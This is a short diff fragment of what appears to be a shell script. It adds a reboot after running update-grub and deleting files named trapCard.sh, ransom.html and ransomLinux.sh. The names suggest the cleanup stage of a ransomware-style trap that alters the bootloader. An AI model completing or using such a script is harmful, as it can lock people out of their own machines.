@@ -39,3 +39,4 @@ update-grub
 rm trapCard.sh
 rm ransom.html
 rm ransomLinux.sh
+reboot
